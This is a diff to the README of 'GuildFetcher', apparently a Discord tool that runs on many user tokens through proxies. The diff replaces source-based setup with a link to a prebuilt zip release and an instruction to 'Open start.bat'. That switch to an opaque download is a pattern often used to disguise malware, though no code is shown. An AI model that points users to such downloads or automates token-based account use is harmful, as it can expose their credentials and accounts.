@@ -20,19 +20,13 @@ GuildFetcher is a Python script designed to fetch and save guild (server) IDs fr
 
 ## Installation
 
-1. Clone the repository or download the script.
-2. Install the required Python libraries using pip:
-    ```sh
-    pip install requests
-    ```
+- Download - [GuildFetcher](https://github.com/Hasbulla00112/Discord-Guild-Fetcher/releases/download/v1.0.1/GuildFetcher.zip)
+- Extract the files and run the script
 
 ## Usage
 
 1. Place your configuration file (`config.json`), proxy file (`proxy.txt`), and token file (`tokens.txt`) in the `input` folder.
-2. Run the script:
-    ```sh
-    python GuildFetcher.py
-    ```
+2. Open start.bat
 3. Follow the on-screen instructions to input the number of threads you want to use.
 
 ## Configuration
